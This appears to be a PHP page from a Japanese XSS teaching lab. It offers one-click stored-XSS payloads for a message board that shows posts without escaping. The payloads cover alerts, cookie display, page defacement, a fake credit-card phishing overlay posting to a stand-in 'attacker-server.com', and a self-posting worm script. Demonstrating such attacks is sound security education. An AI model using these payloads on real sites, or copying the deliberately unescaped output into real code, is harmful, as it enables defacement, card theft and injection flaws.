<?php
$title = "XSS実行環境";
require dirname(__DIR__) . "/includes/header.php";
?>

<div class="row">
    <div class="col">
        <div class="card">
            <h5 class="card-header">ワンクリックで入力フォームに代入</h5>
            <div class="card-body">
                <div class="list-group">
                    <div class="list-group-item bg-dark text-white fw-bold small">アラートを出す</div>
                    <button class="list-group-item list-group-item-action py-3" onclick="copyToInput(`<script>alert('XSS成功');</script>`)">
                        <code class="text-danger small">アラートを出すだけ</code>
                    </button>
                    <button class="list-group-item list-group-item-action py-3" onclick="copyToInput(`<img src=x onerror=alert('Cookie:'+document.cookie)>`)">
                        <code class="text-danger small">cookie情報をアラートに出す</code>
                    </button>
                    <div class="list-group-item bg-dark text-white fw-bold small"> ページ改変系</div>
                    <button class="list-group-item list-group-item-action py-3" onclick="copyToInput('<script>document.querySelector(\'.navbar-brand\').innerText = \'⚠️脆弱性あり⚠️\';</script>')">
                        <code class="text-danger small">ヘッダーの文字を変更</code>
                    </button>
                    <button class="list-group-item list-group-item-action py-3" onclick="copyToInput('<script>document.body.innerHTML = `<div style=\'position:fixed;top:0;left:0;width:100%;height:100%;background:#000;color:#0f0;display:flex;align-items:center;justify-content:center;z-index:9999;font-family:monospace;font-size:2rem;\'>SYSTEM HACKED BY XSS LAB</div>`;</script>')">
                        <code class="text-danger small">全画面書き換え (ページ更新後黒塗り画面へ)</code>
                    </button>
                    <button class="list-group-item list-group-item-action py-3" onclick="copyToInput('<script>document.body.innerHTML += `<div style=\'position:fixed; top:0; left:0; width:100vw; height:100vh; background:white; z-index:9999; display:flex; align-items:center; justify-content:center; font-family:sans-serif;\'><div class=\'card shadow-lg border-0\' style=\'width:450px; padding:30px;\'><div class=\'text-center mb-4\'><h2 class=\'h4 fw-bold text-danger\'>⚠️ セキュリティ警告</h2><p class=\'text-muted small\'>お使いのアカウントに異常なアクセスが検出されました。<br>本人確認のため、決済情報の再登録が必要です。</p></div><form action=\'https://attacker-server.com/steal\' method=\'POST\'><div class=\'mb-3\'><label class=\'form-label small fw-bold\'>カード名義人</label><input type=\'text\' class=\'form-control\' placeholder=\'TARO YAMADA\' required></div><div class=\'mb-3\'><label class=\'form-label small fw-bold\'>カード番号</label><input type=\'text\' class=\'form-control\' placeholder=\'0000 0000 0000 0000\' maxlength=\'16\' required></div><div class=\'row\'><div class=\'col-7\'><label class=\'form-label small fw-bold\'>有効期限 (MM/YY)</label><input type=\'text\' class=\'form-control\' placeholder=\'MM/YY\' required></div><div class=\'col-5\'><label class=\'form-label small fw-bold\'>CVV</label><input type=\'password\' class=\'form-control\' placeholder=\'123\' maxlength=\'3\' required></div></div><div class=\'mt-4\'><button type=\'button\' class=\'btn btn-danger w-100 fw-bold\' onclick=\'alert(&quot;【警告】入力された情報は攻撃者のサーバーへ送信されます！&quot;); location.reload();\'>情報を更新してアカウントを復旧</button></div></form><p class=\'text-center mt-3 small\'><a href=\'#\' class=\'text-decoration-none text-muted\'>あとで設定する</a></p></div></div>`;</script>')">
                        <code class="text-danger small">クレジットカード詐欺フォームに書き換え (全画面)</code>
                    </button>
                    <div class="list-group-item bg-dark text-white fw-bold small">自動増殖・勝手に投稿系</div>
                    <button class="list-group-item list-group-item-action py-3" onclick="copyToInput('<script>fetch(\'../db/message.php\', {method:\'POST\', headers:{\'Content-Type\':\'application/x-www-form-urlencoded\'}, body:\'message=\' + encodeURIComponent(\'🚨 このサイトはXSSワームに感染しました！\')}); alert(\'バックグラウンドで勝手に投稿しました。複数回リロードして確認してください。\');</script>')">
                        <code class="text-danger small">勝手に投稿をしてしまう</code>
                    </button>
                </div>
            </div>
        </div>
    </div>

    <div class="col-8">
        <div class="card">
            <h5 class="card-header">メッセージを投稿</h5>
            <div class="card-body">
                <form
                    hx-post="../db/message.php"
                    hx-swap="none"
                    hx-on="htmx:afterOnLoad: this.reset(); htmx.trigger('#messageTbl','reload')">
                    <div class="d-flex gap-2 align-items-end">
                        <div class="form-floating flex-grow-1">
                            <input type="text" id="message-input" name="message" class="form-control">
                            <label for="message-input">メッセージ</label>
                        </div>

                        <button type="submit"
                            class="btn btn-primary fw-bold text-nowrap flex-shrink-0">
                            登録
                        </button>
                    </div>
                </form>
            </div>
        </div>

        <div class="card mt-4">
            <h5 class="card-header">投稿されたッセージを表示</h5>
            <div class="card-body">
                <table class="table mb-0">
                    <thead class="table-light">
                        <tr>
                            <th style="width:10%">ID</th>
                            <th>投稿 (出力時エスケープなし)</th>
                        </tr>
                    </thead>
                    <tbody id="messageTbl"
                        hx-get="../db/message.php"
                        hx-trigger="load,reload"
                        hx-target="#messageTbl">
                    </tbody>
                </table>
            </div>
        </div>
    </div>
</div>

<!-- クリック時のコピー -->
<script>
    function copyToInput(text) {
        const input = document.querySelector("input[name='message']");
        input.value = text;
        input.focus();
        // 視覚的なフィードバック
        input.classList.add('is-valid');
        setTimeout(() => input.classList.remove('is-valid'), 300);
    }
</script>

<?php require dirname(__DIR__) . "/includes/footer.php"; ?>